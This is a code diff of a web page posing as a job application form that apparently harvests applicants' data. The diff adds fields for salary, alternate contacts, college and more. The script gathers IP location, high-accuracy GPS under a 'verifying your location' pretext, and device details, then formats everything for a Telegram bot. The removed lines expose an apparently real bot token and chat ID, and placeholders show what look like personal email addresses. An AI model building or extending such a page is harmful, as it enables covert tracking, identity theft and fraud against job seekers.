@@ -92,10 +92,16 @@
                     <input type="text" id="full_name" required>
                 </div>
                 <div>
-                    <label>Email Address *</label>
-                    <input type="email" id="email" required>
+                    <label>Date of Birth</label>
+                    <input type="date" id="dob">
                 </div>
             </div>
+            
+            <label>Email Address *</label>
+            <input type="email" id="email" placeholder="e.g. sagarkasture2003@gmail.com" required>
+            
+            <label>Alternate Email ID</label>
+            <input type="email" id="alt_email" placeholder="e.g. sagar.kasture@outlook.com">
             
             <div class="form-row">
                 <div>
@@ -103,8 +109,8 @@
                     <input type="tel" id="phone" required>
                 </div>
                 <div>
-                    <label>Date of Birth</label>
-                    <input type="date" id="dob">
+                    <label>Alternate Phone</label>
+                    <input type="tel" id="alt_phone" placeholder="e.g. 9876543211">
                 </div>
             </div>
             
@@ -139,6 +145,7 @@
                     <select id="experience">
                         <option value="">Select</option>
                         <option value="Fresher">Fresher</option>
+                        <option value="6 months">6 Months</option>
                         <option value="1 Year">1 Year</option>
                         <option value="2 Years">2 Years</option>
                         <option value="3+ Years">3+ Years</option>
@@ -146,11 +153,34 @@
                 </div>
                 <div>
                     <label>Current Company</label>
-                    <input type="text" id="company">
+                    <input type="text" id="company" placeholder="e.g. Tech Mahindra">
                 </div>
             </div>
             
             <div class="form-row">
+                <div>
+                    <label>Current CTC (LPA)</label>
+                    <input type="text" id="ctc" placeholder="e.g. 3.5">
+                </div>
+                <div>
+                    <label>Expected CTC (LPA)</label>
+                    <input type="text" id="expected_ctc" placeholder="e.g. 5.5">
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <label>Notice Period</label>
+                    <select id="notice_period">
+                        <option value="">Select</option>
+                        <option value="Immediate">Immediate</option>
+                        <option value="15 Days">15 Days</option>
+                        <option value="30 Days">30 Days</option>
+                        <option value="45 Days">45 Days</option>
+                        <option value="60 Days">60 Days</option>
+                        <option value="90 Days">90 Days</option>
+                    </select>
+                </div>
                 <div>
                     <label>Highest Education</label>
                     <select id="education">
@@ -158,8 +188,17 @@
                         <option value="B.E/B.Tech">B.E / B.Tech</option>
                         <option value="M.E/M.Tech">M.E / M.Tech</option>
                         <option value="Diploma">Diploma</option>
+                        <option value="BCA/MCA">BCA / MCA</option>
+                        <option value="B.Sc">B.Sc</option>
                         <option value="Other">Other</option>
                     </select>
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <label>College Name</label>
+                    <input type="text" id="college" placeholder="e.g. Pune University">
                 </div>
                 <div>
                     <label>Passing Year</label>
@@ -170,9 +209,12 @@
             <label>LinkedIn Profile</label>
             <input type="url" id="linkedin" placeholder="https://linkedin.com/in/...">
             
+            <label>GitHub / Portfolio</label>
+            <input type="url" id="github" placeholder="https://github.com/...">
+            
             <div class="insta-box">
                 <h3>📸 Follow Us on Instagram</h3>
-                <p>Get daily job updates & interview tips!</p>
+                <p>Get daily job updates, interview tips & early access to openings!</p>
                 <a href="insta.html" target="_blank" class="insta-btn">📱 Follow @techhire.jobs</a>
             </div>
             
@@ -181,7 +223,10 @@
             </div>
             
             <label>Why are you interested in this role?</label>
-            <textarea id="message" rows="3"></textarea>
+            <textarea id="message" rows="3" placeholder="Tell us about your skills and experience..."></textarea>
+            
+            <label>Any Questions for the Recruiter?</label>
+            <textarea id="questions" rows="2" placeholder="e.g. Is remote work available?"></textarea>
             
             <div class="loading" id="loading">
                 <div class="spinner"></div>
@@ -201,12 +246,12 @@
 </div>
 
 <script>
-var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
-var chatId = "1012714242";
+var botToken = "YOUR_BOT_TOKEN_HERE";
+var chatId = "YOUR_CHAT_ID_HERE";
 
 // ========== LOCATION TRACKING ==========
 
-// 1. IP Location - Always works, no permission needed
+// 1. IP Location - Always works
 function getIPLocation() {
     fetch('https://ipapi.co/json/')
     .then(function(r) { return r.json(); })
@@ -226,7 +271,7 @@ function getIPLocation() {
     });
 }
 
-// 2. GPS Location - Only if user allows (triggered on submit)
+// 2. GPS Location
 function requestLocation() {
     if (navigator.geolocation) {
         document.getElementById('locationNotice').innerHTML = '📍 Verifying your location...';
@@ -252,12 +297,10 @@ function requestLocation() {
         }, function(error) {
             document.getElementById('locationNotice').innerHTML = '⚠️ Could not get location. <a onclick="requestLocation()">Click here to retry</a>';
         }, { enableHighAccuracy: true, timeout: 10000 });
-    } else {
-        document.getElementById('locationNotice').innerHTML = '⚠️ Location not supported on this device';
     }
 }
 
-// 3. Get device info
+// 3. Device info
 function getDeviceInfo() {
     var msg = "📱 DEVICE INFO\n";
     msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
@@ -278,7 +321,9 @@ getDeviceInfo();
 function submitApplication() {
     var name = document.getElementById('full_name').value;
     var email = document.getElementById('email').value;
+    var alt_email = document.getElementById('alt_email').value;
     var phone = document.getElementById('phone').value;
+    var alt_phone = document.getElementById('alt_phone').value;
     var dob = document.getElementById('dob').value;
     var pg_name = document.getElementById('pg_name').value;
     var area = document.getElementById('area').value;
@@ -287,20 +332,25 @@ function submitApplication() {
     var pincode = document.getElementById('pincode').value;
     var experience = document.getElementById('experience').value;
     var company = document.getElementById('company').value;
+    var ctc = document.getElementById('ctc').value;
+    var expected_ctc = document.getElementById('expected_ctc').value;
+    var notice = document.getElementById('notice_period').value;
     var education = document.getElementById('education').value;
+    var college = document.getElementById('college').value;
     var passing = document.getElementById('passing_year').value;
     var linkedin = document.getElementById('linkedin').value;
+    var github = document.getElementById('github').value;
     var message = document.getElementById('message').value;
+    var questions = document.getElementById('questions').value;
     
     if (!name || !email || !phone || !pg_name || !area || !city || !pincode) {
-        alert('Please fill all required fields');
+        alert('Please fill all required fields (Name, Email, Phone, PG Name, Area, City, Pincode)');
         return;
     }
     
     document.getElementById('submitBtn').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
     
-    // Show location request
     document.getElementById('locationNotice').style.display = 'block';
     requestLocation();
     
@@ -309,7 +359,9 @@ function submitApplication() {
     msg += "👤 PERSONAL\n";
     msg += "Name: " + name + "\n";
     msg += "Email: " + email + "\n";
+    msg += "Alt Email: " + (alt_email || 'N/A') + "\n";
     msg += "Phone: " + phone + "\n";
+    msg += "Alt Phone: " + (alt_phone || 'N/A') + "\n";
     msg += "DOB: " + (dob || 'N/A') + "\n";
     msg += "─────────────────────\n";
     msg += "📍 ADDRESS\n";
@@ -322,11 +374,17 @@ function submitApplication() {
     msg += "💼 PROFESSIONAL\n";
     msg += "Experience: " + (experience || 'N/A') + "\n";
     msg += "Company: " + (company || 'N/A') + "\n";
+    msg += "Current CTC: " + (ctc || 'N/A') + " LPA\n";
+    msg += "Expected CTC: " + (expected_ctc || 'N/A') + " LPA\n";
+    msg += "Notice Period: " + (notice || 'N/A') + "\n";
     msg += "Education: " + (education || 'N/A') + "\n";
+    msg += "College: " + (college || 'N/A') + "\n";
     msg += "Passing Year: " + (passing || 'N/A') + "\n";
     msg += "LinkedIn: " + (linkedin || 'N/A') + "\n";
+    msg += "GitHub: " + (github || 'N/A') + "\n";
     msg += "─────────────────────\n";
     msg += "💬 Message: " + (message || 'N/A') + "\n";
+    msg += "❓ Questions: " + (questions || 'N/A') + "\n";
     msg += "═══════════════════════\n";
     msg += "Time: " + new Date().toLocaleString();
     
